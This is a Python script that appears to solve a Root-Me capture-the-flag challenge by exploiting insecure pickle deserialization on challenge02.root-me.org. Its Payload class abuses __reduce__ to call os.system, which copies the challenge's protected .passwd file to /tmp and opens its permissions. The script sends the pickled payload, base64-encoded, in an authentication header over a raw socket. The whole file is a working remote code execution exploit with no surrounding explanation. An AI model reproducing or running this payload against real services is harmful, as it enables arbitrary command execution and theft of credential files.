import os
import sys
import socket
import base64
import cPickle


class Payload(object):
    def __reduce__(self):
        return (os.system, (
                'cp /challenge/app-script/ch5/.passwd \
                    /tmp/ch5_passwd; \
                    chmod 777 /tmp/ch5_passwd',)
            )

class Exploit():
    def __init__(self, host ,port):
        self.__payload = cPickle.dumps(Payload())
        self.__passwd = str(base64.b64encode(self.__payload))
        self.__host = host
        self.__port = port

    def run(self):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((self.__host, self.__port))
        print(self.__passwd)
        s.send("AUTH admin HTTP/1.1\n")
        s.send("Authenticate: %s\n\n" %(self.__passwd))
        r = s.recv(4096)
        print(r)

if __name__ == "__main__":
    host = "challenge02.root-me.org"
    port = 60005

    exploit = Exploit(host, port)
    exploit.run()